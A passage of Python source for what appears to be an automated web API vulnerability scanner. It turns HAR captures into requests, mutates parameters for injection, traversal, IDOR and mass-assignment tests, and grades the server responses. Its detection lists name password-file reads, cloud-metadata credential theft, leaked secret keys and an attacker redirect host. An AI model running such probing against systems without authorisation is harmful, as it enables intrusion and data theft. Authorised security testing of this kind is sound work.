    for entry in har.get("log", {}).get("entries", []):
        req = entry.get("request", {})
        url = req.get("url", "")

        # Skip non-HTTP URLs
        if url.startswith("data:") or url.startswith("blob:"):
            continue

        method = req.get("method", "GET").upper()

        # Build headers dict — skip HTTP/2 pseudo-headers (starting with ':')
        headers = {}
        for h in req.get("headers", []):
            name = h.get("name", "")
            if name.startswith(":"):
                continue
            headers[name] = h.get("value", "")

        # Query params from HAR queryString list
        query_params = {}
        for qp in req.get("queryString", []):
            query_params[qp.get("name", "")] = qp.get("value", "")

        # Body
        body = None
        body_type = None
        post_data = req.get("postData", {})
        if post_data:
            mime = post_data.get("mimeType", "")
            raw_body = post_data.get("text", "")
            if raw_body:
                if "json" in mime:
                    try:
                        body = json.loads(raw_body); body_type = "json"
                    except json.JSONDecodeError:
                        body = raw_body; body_type = "raw"
                elif "form" in mime or "urlencoded" in mime:
                    body = dict(urllib.parse.parse_qsl(raw_body)); body_type = "form"
                else:
                    # Auto-detect
                    try:
                        body = json.loads(raw_body); body_type = "json"
                    except json.JSONDecodeError:
                        parsed_form = dict(urllib.parse.parse_qsl(raw_body))
                        if parsed_form:
                            body = parsed_form; body_type = "form"
                        else:
                            body = raw_body; body_type = "raw"

        entries.append(CURLEntry(method, url, headers, query_params, body, body_type))

    return entries


class CURLEntry:
    """Represents a single parsed cURL request."""

    def __init__(self, method, url, headers, query_params, body, body_type):
        self.method       = method.upper()
        self.url          = url
        self.headers      = headers
        self.query_params = query_params  # {name: value}
        self.body         = body          # dict | str | None
        self.body_type    = body_type     # "json" | "form" | "raw" | None

    @property
    def path(self):
        return urlparse(self.url).path

    def all_params(self):
        """
        Return [(source, param_name, value), ...].
        Nested JSON (objects + arrays) expanded to leaf values, e.g.
        changes[0].field. Headers are included for optional UI filtering.
        """
        params = []

        for k, v in self.query_params.items():
            if k.lower() not in IGNORED_FIELDS:
                params.append(("query", k, v))

        if isinstance(self.body, dict):
            self._collect_body_params(self.body, "", params, depth=0, max_depth=12)
        elif isinstance(self.body, list):
            self._collect_body_params(self.body, "", params, depth=0, max_depth=12)

        for k, v in (self.headers or {}).items():
            kl = k.lower()
            if kl in _SKIP_HEADER_PARAMS or k.startswith(":"):
                continue
            if kl in IGNORED_FIELDS:
                continue
            params.append(("header", k, v))

        return params

    @staticmethod
    def _body_src(path):
        return "body" if (not path or ("." not in path and "[" not in path)) else "body_nested"

    @staticmethod
    def _collect_body_params(obj, prefix, params, depth, max_depth):
        """Recurse dicts/lists until scalar leaves (end-level params)."""
        if depth > max_depth:
            if prefix:
                params.append((
                    CURLEntry._body_src(prefix), prefix,
                    json.dumps(obj) if isinstance(obj, (dict, list)) else obj,
                ))
            return

        if isinstance(obj, dict):
            if not obj and prefix:
                params.append((CURLEntry._body_src(prefix), prefix, "{}"))
                return
            for k, v in obj.items():
                if str(k).lower() in IGNORED_FIELDS:
                    continue
                path = f"{prefix}.{k}" if prefix else str(k)
                CURLEntry._emit_body_value(v, path, params, depth, max_depth)
            return

        if isinstance(obj, list):
            if not obj and prefix:
                params.append((CURLEntry._body_src(prefix), prefix, "[]"))
                return
            for i, v in enumerate(obj):
                path = f"{prefix}[{i}]" if prefix else f"[{i}]"
                CURLEntry._emit_body_value(v, path, params, depth, max_depth)
            return

        if prefix:
            params.append((CURLEntry._body_src(prefix), prefix, obj))

    @staticmethod
    def _emit_body_value(v, path, params, depth, max_depth):
        # Double-encoded JSON string → parse and descend
        if isinstance(v, str):
            s = v.strip()
            if s[:1] in "{[" and s[-1:] in "}]":
                try:
                    parsed = json.loads(s)
                    if isinstance(parsed, (dict, list)):
                        CURLEntry._collect_body_params(
                            parsed, path, params, depth + 1, max_depth
                        )
                        return
                except Exception:
                    pass
            params.append((CURLEntry._body_src(path), path, v))
            return

        if isinstance(v, (dict, list)):
            CURLEntry._collect_body_params(v, path, params, depth + 1, max_depth)
            return

        params.append((CURLEntry._body_src(path), path, v))

    def all_params_flat(self):
        """Flat dict of all params (for cross-reference in IDOR swap)."""
        d = dict(self.query_params)
        if isinstance(self.body, dict):
            for k, v in self.body.items():
                if not isinstance(v, (dict, list)):
                    d[k] = v
        return d


# ---------------------------------------------------------------------------
#  REQUEST ENGINE
# ---------------------------------------------------------------------------

def build_session(verify_ssl=False):
    s = requests.Session()
    r = Retry(total=2, backoff_factor=0.5, status_forcelist=[500, 502, 503])
    a = HTTPAdapter(max_retries=r)
    s.mount("http://", a)
    s.mount("https://", a)
    s.verify = verify_ssl
    return s



# Headers that must be unique per request to avoid server-side idempotency rejection.
# 'requestid' and 'session-state' are common culprits — server returns 400 if
# the same value is reused across requests.
_IDEMPOTENCY_HEADERS = {"requestid", "x-request-id", "x-requestid", "x-correlation-id",
                        "correlation-id", "idempotency-key", "x-idempotency-key"}


def send_request(session, method, url, headers, qp, body, body_type, bearer, timeout):
    hdrs = dict(headers)
    if bearer:
        hdrs["Authorization"] = bearer if bearer.lower().startswith("bearer ") else f"Bearer {bearer}"

    # Auto-refresh idempotency headers so server doesn't reject as duplicate request
    for hdr_key in list(hdrs.keys()):
        if hdr_key.lower() in _IDEMPOTENCY_HEADERS:
            import random as _r
            hdrs[hdr_key] = str(_r.randint(10**15, 10**16 - 1))

    parsed  = urlparse(url)
    base_qs = parse_qs(parsed.query, keep_blank_values=True)
    for k, val in (qp or {}).items():
        # Support real HPP: list values → multiple same-name query params
        if isinstance(val, (list, tuple)):
            base_qs[k] = [str(x) for x in val]
        else:
            base_qs[k] = [str(val)]
    pairs = [(k, item) for k, vals in base_qs.items() for item in vals]
    new_q = urlencode(pairs, doseq=False, quote_via=urllib.parse.quote)
    url = parsed._replace(query=new_q).geturl()

    kw = {"headers": hdrs, "timeout": timeout}
    if   body_type == "json": kw["json"] = body
    elif body_type == "form": kw["data"] = body
    elif body_type == "raw":  kw["data"] = body

    try:
        return session.request(method, url, **kw)
    except Exception:
        return None


def snap(resp):
    if resp is None:
        return {"status": None, "text": "", "length": 0, "headers": {}}
    try:
        text = resp.text[:6000]
    except Exception:
        text = ""
    try:
        hdrs = dict(resp.headers)
    except Exception:
        hdrs = {}
    return {
        "status":  resp.status_code,
        "text":    text,
        "length":  len(resp.content) if resp.content else 0,
        "headers": hdrs,
    }


# ---------------------------------------------------------------------------
#  RESPONSE COMPARISON + RISK CLASSIFICATION
# ---------------------------------------------------------------------------

# Patterns that indicate the SERVER correctly rejected/validated the input.
# If mutated response only differs because of these → NOT a real finding.
REJECTION_PATTERNS = [
    "invalid parameter", "invalid value", "invalid input", "invalid request",
    "invalid change", "invalid type", "invalid field", "invalid format",
    "invalid enum", "invalid status", "invalid option",
    "validation error", "validation failed", "bad request", "field required",
    "must be", "is required", "not allowed", "not permitted", "not valid",
    "is not a valid", "is not valid", "not a valid",
    "allowed values", "allowed value", "must be one of", "one of the following",
    "does not match", "failed validation", "unprocessable",
    "illegal", "malformed", "parse error", "schema error", "constraint",
    "out of range", "too long", "too short", "maximum", "minimum",
    "expected type", "type error", "unsupported", "unrecognized field",
    "unknown field", "extra field", "unexpected field",
    # Security-aware rejection signals — server detected and blocked the attempt
    "unsafe input", "unsafe request", "unsafe content",
    "blocked", "input blocked", "request blocked",
    "harmful", "harmful input", "harmful content",
    "prohibited", "prohibited input",
    "malicious", "malicious input", "malicious content",
    "attack detected", "xss detected", "sql injection detected",
    "injection detected", "injection attempt",
    "input rejected", "request rejected",
    "forbidden input", "content not allowed",
    "security violation", "policy violation",
]

# Soft phrases checked only on client-error statuses (400/422/…).
# Broader than REJECTION_PATTERNS — "invalid …" covers enum/business validation.
VALIDATION_SOFT_PATTERNS = [
    "invalid", "not allowed", "not permitted", "not supported",
    "allowed values", "allowed value", "must be one of",
    "unprocessable", "bad request", "constraint",
]

# Type / number / JSON deserialize failures — often returned as HTTP 500
# (unhandled NumberFormatException / BigDecimal / Jackson) instead of 400.
# These are input-rejection FPs for IDOR/SQLi/biz mutations, NOT injection proof.
TYPE_PARSE_ERROR_PATTERNS = [
    # Java BigDecimal / NumberFormatException (seen on HR / Spring APIs)
    "neither a decimal digit",
    "decimal digit number",
    "decimal point, nor",
    '"e" notation',
    "'e' notation",
    "e notation exponential",
    "missing \"e\" notation",
    "missing 'e' notation",
    "character array is missing",
    "numberformatexception",
    "for input string:",
    "for input string \"",
    # Jackson / JSON binding
    "cannot deserialize value of type",
    "cannot deserialize",
    "cannot coerce",
    "cannot construct instance",
    "not a valid integer",
    "not a valid long",
    "not a valid double",
    "not a valid float",
    "not a valid number",
    "not a valid int",
    "expected a number",
    "expected int",
    "expected long",
    "expected double",
    "expected float",
    "failed to convert",
    "failed to parse number",
    "failed to parse int",
    "type mismatch",
    "wrong type",
    "incompatible types",
    "cannot be cast to",
    "classcastexception",
    # Generic JSON parse of bad mutation (not SQL)
    "unexpected character (",
    "unrecognized token",
    "not a json object",
    "jsonparseexception",
    "mismatchedinputexception",
    "invalidformatexception",
]

# Clear validation language that is still "reject" even when status is 5xx
# (app threw instead of returning 400). Keep narrow — do NOT use vague words.
SAFE_5XX_REJECT_PATTERNS = [
    "allowed values", "allowed value", "must be one of",
    "invalid change", "invalid type", "invalid format", "invalid enum",
    "validation error", "validation failed", "failed validation",
    "unprocessable", "expected type", "constraint violation",
    "unrecognized field", "unknown field", "extra field", "unexpected field",
]

# Framework tokens that often prefix type-parse messages; alone ≠ stack disclosure
_SOFT_FRAMEWORK_LEAK_TOKENS = {
    "java.lang", "php warning", "php fatal",
}

# SQL / DB error & schema disclosure — always High Risk when newly present.
# Matched against mutated body (not in original, not just payload echo).
SQL_DISCLOSURE_PATTERNS = [
    # Generic SQL error language
    "sql error", "sql exception", "sqlexception", "sqlstate",
    "sql syntax", "you have an error in your sql",
    "incorrect syntax near", "syntax error near",
    "unclosed quotation", "quoted string not properly terminated",
    "unterminated quoted string", "unterminated string",
    # Column / table / schema exposure
    "unknown column", "invalid column", "no such column",
    "column doesn't exist", "column does not exist",
    "ambiguous column", "duplicate column name",
    "unknown table", "no such table", "invalid object name",
    "table doesn't exist", "table does not exist",
    "relation does not exist", "undefined table", "undefined column",
    "information_schema", "pg_catalog",
    # Driver / engine fingerprints
    "mysql_fetch", "mysqli_", "mysql error", "warning: mysql",
    "pg_query", "psycopg", "postgresql query failed", "pgsql",
    "sqlite3", "sqlite error", "sqliteexception",
    "ora-", "pls-", "oracle error",
    "odbc sql", "ole db", "sql server", "microsoft.sqlserver",
    "jdbc", "hibernate", "django.db", "sqlalchemy",
    "com.mysql", "org.hibernate", "org.postgresql",
    "sqlcommand", "ado.net", "system.data.sqlclient",
]

# Patterns that confirm a HIGH-risk finding regardless of status code.
LEAK_PATTERNS = [
    # Non-SQL leaks (SQL handled via SQL_DISCLOSURE_PATTERNS)
    "division by zero",
    "stacktrace", "stack trace",
    "traceback", "exception in thread", "nullpointerexception",
    "java.lang", "php warning", "php fatal",
    # Path leaks
    "/var/www", "/home/", "c:\\", "d:\\",
    # Internal IPs
    "192.168.", "10.0.", "127.0.0.1", "localhost",
    # JWT / auth
    "jwterror", "jwt malformed", "signature verification",
    # Config / secrets
    "aws_secret", "api_key", "secret_key", "private_key",
    # Successful privilege escalation signals
    "is_admin\":true", "\"role\":\"admin\"", "\"admin\":true",
    "role: admin", "privilege: superuser",
    # XXE confirmation signals
    "root:x:", "daemon:", "/etc/passwd", "win.ini", "[boot loader]",
    # LDAP errors
    "ldap error", "ldapsearchresult", "invaliddn", "sizelimit",
    # Deserialization errors
    "unserialize", "pickle.loads", "readobject", "classnotfound",
    "java.io.objectinputstream", "java.lang.reflect",
    # XPath errors
    "xpath", "xpathexception", "invalid xpath", "xpathfunctionexception",
    # GraphQL errors
    "graphql error", "cannot query field", "did you mean",
    "__schema", "__typename",
    # ReDoS / timeout signals
    "gateway timeout", "request timeout",
    # CRLF confirmation
    "x-injected",
    # Open Redirect signals
    "location: https://attacker",
]


def _match_new_patterns(patterns, mut_lower, orig_lower, payload_lower):
    """Return patterns newly present in mut body (not orig, not payload echo)."""
    hits = []
    for p in patterns:
        if p in mut_lower and p not in orig_lower and p not in payload_lower:
            hits.append(p)
    return hits


_SQL_COLUMN_RE = re.compile(
    r"(?:unknown|invalid|ambiguous)?\s*column\s+[`'\"][\w.\-]+[`'\"]"
    r"|column\s+[`'\"][\w.\-]+[`'\"]\s+(?:does not|doesn't|not found)",
    re.I,
)
_SQL_TABLE_RE = re.compile(
    r"(?:unknown|invalid|no such)\s+table\s+[`'\"]?[\w.\-]+"
    r"|table\s+[`'\"][\w.\-]+[`'\"]\s+(?:does not|doesn't)",
    re.I,
)


def _find_new_sensitive(orig_lower, mut_lower):
    """Return sensitive keywords newly present in mut, with structural filter
    so substring hits inside ordinary words don't count."""
    hits = []
    for kw in SENSITIVE_KEYWORDS:
        if kw not in mut_lower or kw in orig_lower:
            continue
        # Cloud / SSRF tokens — plain substring is enough
        if kw in ("169.254.169.254", "ami-id", "instance-id",
                  "security-credentials", "computemetadata", "serviceaccounttoken"):
            hits.append(kw)
            continue
        # Prefer JSON key / quoted value / word-boundary forms
        if re.search(
            rf'(?:["\']{re.escape(kw)}["\']\s*:|[:=]\s*["\']?{re.escape(kw)}\b|'
            rf'\b{re.escape(kw)}\b)',
            mut_lower,
        ):
            hits.append(kw)
    return hits


def _coerce_mut_value(mutated_value, mutation_label, body_type):
    """For JSON bodies, parse type-confusion payloads into real JSON types."""
    if body_type != "json" or not mutation_label.startswith("23_type"):
        return mutated_value
    s = str(mutated_value)
    if s in ("true", "false", "null") or (s[:1] in "[{") or re.fullmatch(r"-?\d+(\.\d+)?", s):
        try:
            return json.loads(s)
        except Exception:
            pass
    return mutated_value


def _parse_nested_path(path):
    """
    Split 'changes[0].field' / 'a.b.0.c' into ['changes', 0, 'field'].
    """
    if not path:
        return []
    parts = []
    for m in re.finditer(r"\[(\d+)\]|([^.\[\]]+)", str(path)):
        if m.group(1) is not None:
            parts.append(int(m.group(1)))
        else:
            tok = m.group(2)
            parts.append(int(tok) if tok.isdigit() else tok)
    return parts


def _set_nested_value(root, dotted, value):
    """
    Set dotted/indexed path on a dict/list tree, deep-copying containers.
    Supports: changes[0].field, nested.key, arr.0.val
    """
    if root is None or not dotted:
        return False
    if not isinstance(root, (dict, list)):
        return False

    parts = _parse_nested_path(dotted)
    if not parts:
        return False

    node = root
    for p in parts[:-1]:
        if isinstance(p, int):
            if not isinstance(node, list) or p < 0 or p >= len(node):
                return False
            cur = node[p]
            if isinstance(cur, (dict, list)):
                node[p] = deepcopy(cur)
            node = node[p]
        else:
            if not isinstance(node, dict) or p not in node:
                return False
            cur = node[p]
            if isinstance(cur, (dict, list)):
                node[p] = deepcopy(cur)
            node = node[p]

    last = parts[-1]
    if isinstance(last, int):
        if not isinstance(node, list) or last < 0 or last >= len(node):
            return False
        node[last] = value
    else:
        if not isinstance(node, dict):
            return False
        node[last] = value
    return True


def _apply_special_mutation(me, entry, source, param_name, orig_value,
                            mutation_label, mutated_value):
    """
    Apply __HEADER__ / __HPP__ / __EXTRA__ / __MASS__ / normal mutations.
    Returns True if handled (including normal assign).
    """
    mv_s = "" if mutated_value is None else str(mutated_value)

    if mv_s.startswith("__HEADER__"):
        rest = mv_s[len("__HEADER__"):]
        hk, _, hv = rest.partition("=")
        if hk.strip():
            me.headers[hk.strip()] = hv
        return True

    if mv_s.startswith("__HPP__"):
        inject = mv_s[len("__HPP__"):]
        if source == "query":
            me.query_params[param_name] = [str(orig_value), inject]
        elif source == "header":
            me.headers[param_name] = f"{orig_value}, {inject}"
        elif source == "body" and isinstance(me.body, dict):
            me.body[param_name] = [orig_value, inject]
        elif source == "body_nested" and isinstance(me.body, dict):
            _set_nested_value(me.body, param_name, [orig_value, inject])
        return True

    if mv_s.startswith("__EXTRA__"):
        kv = mv_s[len("__EXTRA__"):]
        ik, _, iv = kv.partition("=")
        if not ik:
            return True
        if isinstance(me.body, dict) and source in ("body", "body_nested"):
            me.body[ik] = iv
        else:
            me.query_params[ik] = iv
        return True

    if mv_s.startswith("__MASS__"):
        kv = mv_s[8:]
        inject_key, _, inject_val = kv.partition("=")
        if source == "query":
            me.query_params[inject_key] = inject_val
        elif source in ("body", "body_nested") and isinstance(me.body, dict):
            me.body[inject_key] = inject_val
        elif me.body_type == "form" and isinstance(me.body, dict):
            me.body[inject_key] = inject_val
        return True

    # Normal value replace (with JSON type coercion for body)
    body_type = me.body_type if source in ("body", "body_nested") else None
    coerced = _coerce_mut_value(mutated_value, mutation_label, body_type)

    if source == "query":
        me.query_params[param_name] = coerced
    elif source == "header":
        me.headers[param_name] = str(coerced)
    elif source in ("body", "body_nested") and isinstance(me.body, (dict, list)):
        if "." in param_name or "[" in param_name:
            _set_nested_value(me.body, param_name, coerced)
        elif isinstance(me.body, dict):
            me.body[param_name] = coerced
    return True


def compare(orig, mutated, mutation_label="", payload="",
            elapsed_orig=0.0, elapsed_mut=0.0, timeout=10):
    o_s, m_s = orig["status"],  mutated["status"]
    o_l, m_l = orig["length"],  mutated["length"]
    o_t, m_t = orig["text"],    mutated["text"]

    m_t_lower = m_t.lower() if m_t else ""
    o_t_lower = o_t.lower() if o_t else ""

    # Normalize before comparing — strips timestamps, UUIDs, request IDs
    o_norm        = normalize_for_diff(o_t) if o_t else ""
    m_norm        = normalize_for_diff(m_t) if m_t else ""
    norm_diff_pct = (
        abs(len(m_norm) - len(o_norm)) / len(o_norm) * 100
        if o_norm else (100.0 if m_norm else 0.0)
    )
    norm_changed = (o_norm != m_norm)

    evidence = []

    # ── 2. Time-based blind injection ────────────────────────────────────────
    time_hit = is_time_based_hit(mutation_label, elapsed_orig, elapsed_mut, timeout)
    if time_hit:
        evidence.append(
            f"time_delay:{elapsed_mut - elapsed_orig:.1f}s (base:{elapsed_orig:.1f}s)"
        )

    # ── 3. Context-aware SSTI eval confirmation ──────────────────────────────
    ssti_hit = (
        mutation_label.startswith("13_ssti")
        and check_ssti_confirmed(mutation_label, o_t_lower, m_t_lower)
    )
    if ssti_hit:
        evidence.append("ssti_eval_confirmed")

    # ── 4. Payload reflection (only for injection-category mutations) ─────────
    reflection = None
    if mutation_label.startswith(("12_xss", "13_ssti", "11_sqli",
                                   "11b_cmdi", "14_path")):
        reflection = detect_reflection(payload, m_t)
        if reflection:
            evidence.append(f"reflected:{reflection}")

    # ── 4b. CMDi time-delay labels: if time_hit is False, execution did NOT
    #        happen — the payload was only stored (possible second-order injection).
    #        Clear reflection so it doesn't bubble up to "Likely/Confirmed".
    #        Add a dedicated stored-injection evidence note instead.
    is_time_cmdi = mutation_label in _TIME_DELAY_LABELS
    if is_time_cmdi and not time_hit and reflection:
        reflection = None   # suppress — no execution proof
        evidence = [e for e in evidence if not e.startswith("reflected:")]
        evidence.append("stored_cmdi:payload_saved_as_string_possible_2nd_order")

    # ── 5. Known leak signatures (DB errors, stack traces, internal IPs …) ───
    # Exclude patterns that came from the payload itself being reflected back —
    # that is just storage/echo, not server-side execution or info disclosure.
    payload_lower = str(payload).lower() if payload else ""

    # SQL error / column / table disclosure (dedicated — feeds SQL filter)
    sql_hits = _match_new_patterns(
        SQL_DISCLOSURE_PATTERNS, m_t_lower, o_t_lower, payload_lower
    )
    # Named column/table mentions even when phrasing varies slightly
    if m_t:
        for rx, tag in ((_SQL_COLUMN_RE, "column_name_exposed"),
                        (_SQL_TABLE_RE, "table_name_exposed")):
            if rx.search(m_t) and not rx.search(o_t or ""):
                # Avoid counting pure payload echo of injected SQL fragments
                if tag not in sql_hits and tag not in payload_lower:
                    sql_hits.append(tag)

    if sql_hits:
        evidence.append(f"sql_disclosure:{','.join(sql_hits[:3])}")

    leak_kws = _match_new_patterns(
        LEAK_PATTERNS, m_t_lower, o_t_lower, payload_lower
    )
    # SQL disclosure counts as a confirmed leak for risk scoring
    leak_kws = list(dict.fromkeys(sql_hits + leak_kws))
    if leak_kws and not sql_hits:
        evidence.append(f"leak:{','.join(leak_kws[:3])}")
    elif leak_kws and sql_hits:
        other = [k for k in leak_kws if k not in sql_hits]
        if other:
            evidence.append(f"leak:{','.join(other[:3])}")

    sql_disclosure = bool(sql_hits)

    # ── 1. Server properly rejected input (after leaks — leaks override) ──────
    # Covers: validation language on 4xx, soft "invalid …" on client errors,
    # success→400/422 (enum/schema reject), and success→5xx type/number parse
    # crashes (BigDecimal / Jackson) which are input rejects, not injection.
    client_err = m_s in (400, 401, 422, 415, 405)
    server_err = m_s in (500, 502, 503)
    rejection_in_body = any(p in m_t_lower for p in REJECTION_PATTERNS) or (
        client_err and any(p in m_t_lower for p in VALIDATION_SOFT_PATTERNS)
    )
    type_parse_err = any(p in m_t_lower for p in TYPE_PARSE_ERROR_PATTERNS)
    safe_5xx_reject = any(p in m_t_lower for p in SAFE_5XX_REJECT_PATTERNS)
    success_to_client_err = o_s in (200, 201, 204) and m_s in (400, 422)
    success_to_server_err = o_s in (200, 201, 204) and server_err

    # Soft framework prefixes on a clear type-parse body ≠ real stack disclosure
    if type_parse_err and leak_kws and not sql_disclosure:
        strong = [k for k in leak_kws if k not in _SOFT_FRAMEWORK_LEAK_TOKENS]
        if not strong:
            leak_kws = []
            evidence = [
                e for e in evidence
                if not (e.startswith("leak:") and not e.startswith("leak:sql"))
            ]

    server_input_reject = (
        success_to_server_err
        and (type_parse_err or safe_5xx_reject)
        and not leak_kws
        and not sql_disclosure
    )
    properly_rejected = (
        (rejection_in_body and (client_err or m_s == o_s))
        or (success_to_client_err and not leak_kws)
        or server_input_reject
    )
    # Payload echoed inside a validation / type-parse error ≠ injectable reflection
    if properly_rejected and not (time_hit or ssti_hit or leak_kws or sql_disclosure):
        if reflection:
            reflection = None
            evidence = [e for e in evidence if not e.startswith("reflected:")]
        if server_input_reject:
            evidence.append(
                "rejected:type_parse_5xx" if type_parse_err else "rejected:validation_5xx"
            )
        else:
            evidence.append("rejected:client_validation")

    # ── 6. New sensitive keywords (tight list + structural match) ────────────
    sensitive_kws = _find_new_sensitive(o_t_lower, m_t_lower)
    if sensitive_kws:
        evidence.append(f"sensitive:{','.join(sensitive_kws[:3])}")

    # ── 7. Status upgrade: denied → allowed ─────────────────────────────────
    status_upgrade = (
        o_s in (400, 401, 403, 404, 405, 422, 500)
        and m_s == 200
    )
    if status_upgrade:
        evidence.append(f"status_upgrade:{o_s}→{m_s}")

    # ── 7b. CORS misconfiguration ────────────────────────────────────────────
    mut_hdrs     = mutated.get("headers", {})
    orig_hdrs    = orig.get("headers", {})
    acao_mut     = mut_hdrs.get("Access-Control-Allow-Origin", "")
    acac_mut     = mut_hdrs.get("Access-Control-Allow-Credentials", "").lower()
    acao_orig    = orig_hdrs.get("Access-Control-Allow-Origin", "")

    cors_issue = None
    if acao_mut == "*" and acac_mut == "true":
        cors_issue = "cors:wildcard+credentials_critical"
    elif acao_mut and acao_mut not in ("null", "", acao_orig):
        # Check if Origin header value is reflected (origin reflection = vuln)
        _origin_sent = payload if payload else ""
        if _origin_sent and acao_mut == _origin_sent:
            cors_issue = f"cors:origin_reflected:{acao_mut[:60]}"
        elif acao_mut not in ("*", "null") and acao_mut != acao_orig:
            cors_issue = f"cors:origin_changed:{acao_orig[:30]}→{acao_mut[:30]}"
    if cors_issue:
        evidence.append(cors_issue)

    # ── 7c. Missing / changed security headers ───────────────────────────────
    _sec_headers = [
        "X-Frame-Options", "X-Content-Type-Options",
        "Strict-Transport-Security", "Content-Security-Policy",
    ]
    for _sh in _sec_headers:
        _sh_lower = _sh.lower()
        in_orig = any(_sh_lower == k.lower() for k in orig_hdrs)
        in_mut  = any(_sh_lower == k.lower() for k in mut_hdrs)
        if in_orig and not in_mut:
            evidence.append(f"sec_header_removed:{_sh}")

    # ── 8. JSON semantic diff: new privilege fields, value changes, array growth
    json_evidence = None
    if m_s in (200, 201) and o_t and m_t:
        json_evidence = semantic_json_diff(o_t, m_t)
        if json_evidence:
            evidence.extend(json_evidence)

    # ── 9. Normalized body grew on 200 ───────────────────────────────────────
    body_grew_200 = (m_s == 200 and norm_diff_pct > 15 and m_l > o_l)
    if body_grew_200:
        evidence.append(f"body_grew:{norm_diff_pct:.0f}%")

    # ── Confidence + risk ────────────────────────────────────────────────────
    sec_headers_removed = any("sec_header_removed" in e for e in evidence)
    stored_cmdi = any("stored_cmdi" in e for e in evidence)

    confirmed = bool(time_hit or ssti_hit or status_upgrade or leak_kws
                     or json_evidence
                     or (cors_issue and "critical" in (cors_issue or "")))
    likely    = bool(reflection or sensitive_kws or body_grew_200
                     or (cors_issue and "critical" not in (cors_issue or ""))
                     or sec_headers_removed)
    # "Possible" requires a real signal: status escalation, payload reflection,
    # leak keyword, significant body growth at 200, or stored-injection evidence.
    # Pure body-diff with the same status code is noise (echoed values,
    # different error messages, etc.) and should NOT produce a finding.
    # 200→400/422 or 200→5xx type/parse reject = validation noise, not a finding.
    status_noise = success_to_client_err or server_input_reject or (
        client_err and rejection_in_body and o_s != m_s
    )
    possible  = bool(
        stored_cmdi
        or (
            norm_changed
            and norm_diff_pct > 10
            and not status_noise
            and (o_s != m_s or reflection or leak_kws or body_grew_200)
        )
    )

    # properly_rejected overrides everything EXCEPT genuine time-based, SSTI,
    # or memory-leak / SQL-disclosure signals (those bypass body-text rejection).
    if properly_rejected and not (time_hit or ssti_hit or leak_kws or sql_disclosure):
        risk, confidence = "No Issue", "No Issue"
    elif sql_disclosure:
        # DB error / column-table exposure is always a confirmed issue
        risk, confidence = "High Risk", "Confirmed"
    elif stored_cmdi and not confirmed:
        # Payload stored as string — possible second-order injection, not immediate
        risk, confidence = "Possible", "Possible"
    elif confirmed:
        risk, confidence = "High Risk", "Confirmed"
    elif likely:
        # Sensitive keywords alone are Medium — require XSS reflection or
        # another strong signal before escalating to High (cuts FP noise).
        if reflection and mutation_label.startswith("12_xss"):
            risk, confidence = "High Risk", "Likely"
        elif sensitive_kws and (body_grew_200 or leak_kws or json_evidence):
            risk, confidence = "High Risk", "Likely"
        else:
            risk, confidence = "Medium Risk", "Likely"
    elif possible:
        risk, confidence = "Medium Risk", "Possible"
    else:
        risk, confidence = "No Issue", "No Issue"

    # Suppress noise: empty body + no status change
    if not m_t and o_s == m_s and not sql_disclosure:
        risk, confidence = "No Issue", "No Issue"

    all_kws = list(dict.fromkeys(leak_kws + sensitive_kws))

    return {
        "status_changed": "Yes" if o_s != m_s else "No",
        "diff_pct":        round(norm_diff_pct, 2),
        "body_changed":    "Yes" if norm_changed else "No",
        "keywords":        ", ".join(all_kws),
        "risk_level":      risk,
        "confidence":      confidence,
        "evidence":        " | ".join(evidence),
        "time_delta":      round(elapsed_mut - elapsed_orig, 2),
        "sql_disclosure":  sql_disclosure,
    }


# ---------------------------------------------------------------------------
#  TASK BUILDER + WORKER
# ---------------------------------------------------------------------------

REQ_BODY_LIMIT = 80_000
REQ_DUMP_LIMIT = 100_000


def clip_dump(text, limit=REQ_DUMP_LIMIT):
    s = "" if text is None else str(text)
    if len(s) <= limit:
        return s
    return s[:limit] + "\n\n… [truncated — Copy cURL has the full request]"


def req_repr(method, url, headers, body, body_type):
    lines = [f"{method} {url}"]
    lines += [f"{k}: {v}" for k, v in list(headers.items())[:40]]
    if body:
        lines.append("")
        blob = json.dumps(body, indent=2) if body_type == "json" else str(body)
        lines.append(clip_dump(blob, REQ_BODY_LIMIT))
    return clip_dump("\n".join(lines), REQ_DUMP_LIMIT)


# Hop-by-hop / HTTP/2-illegal / browser-auto headers. Leaving these in Copy
# cURL makes Postman send duplicates (e.g. authorization + Authorization, or
# Postman's own Accept + ours) → "HTTP/2 Protocol Error: Header field must
# only have a single value".
_CURL_SKIP_HEADERS = {
    "content-length", "host", "connection", "transfer-encoding",
    "accept-encoding", "content-encoding", "keep-alive",
    "proxy-connection", "te", "trailer", "upgrade", "http2-settings",
    "upgrade-insecure-requests",
}
_CURL_SKIP_PREFIXES = ("sec-ch-", "sec-fetch-", "sec-gpc")


def _curl_skip_header(name):
    lk = (name or "").lower()
    if not lk or lk.startswith(":"):
        return True
    if lk in _CURL_SKIP_HEADERS:
        return True
    return any(lk.startswith(p) for p in _CURL_SKIP_PREFIXES)


def _fold_curl_headers(raw, bearer=None):
    """One header per name (case-insensitive). Bearer overwrites Authorization."""
    folded = {}
    for k, v in (raw or {}).items():
        if _curl_skip_header(k):
            continue
        folded[str(k).lower()] = (k, v)
    if bearer:
        folded["authorization"] = (
            "Authorization",
            bearer if str(bearer).lower().startswith("bearer ") else f"Bearer {bearer}",
        )
    return folded


def _curl_arg(s):
    """Quote a curl argument so Postman Import *and* bash can parse it.

    Never emit bash '\\'' concatenation — Postman treats that as literal
    characters, so SQL/XSS payloads with a single quote produce a broken body
    and the imported request will not send.
    """
    s = "" if s is None else str(s)
    if "'" not in s and "\n" not in s and "\r" not in s:
        return "'" + s + "'"
    escaped = (
        s.replace("\\", "\\\\")
         .replace('"', '\\"')
         .replace("\n", "\\n")
         .replace("\r", "\\r")
    )
    return '"' + escaped + '"'


def entry_to_curl(entry, bearer=None):
    """Pasteable cURL from a CURLEntry (original or mutated), matching send_request URL merge."""
    if entry is None:
        return ""
    method = (getattr(entry, "method", None) or "GET").upper()
    headers = _fold_curl_headers(getattr(entry, "headers", None) or {}, bearer)

    parsed = urlparse(entry.url or "")
    base_qs = parse_qs(parsed.query, keep_blank_values=True)
    for k, val in (getattr(entry, "query_params", None) or {}).items():
        if isinstance(val, (list, tuple)):
            base_qs[k] = [str(x) for x in val]
        else:
            base_qs[k] = [str(val)]
    pairs = [(k, item) for k, vals in base_qs.items() for item in vals]
    new_q = urlencode(pairs, doseq=False, quote_via=urllib.parse.quote)
    url = parsed._replace(query=new_q).geturl()

    # HTTP/1.1: Postman defaults to HTTP/2 on https, which rejects duplicate
    # singleton headers (Accept/Content-Type/Authorization) as a protocol error.
    lines = [f"curl --http1.1 -X {method} {_curl_arg(url)}"]
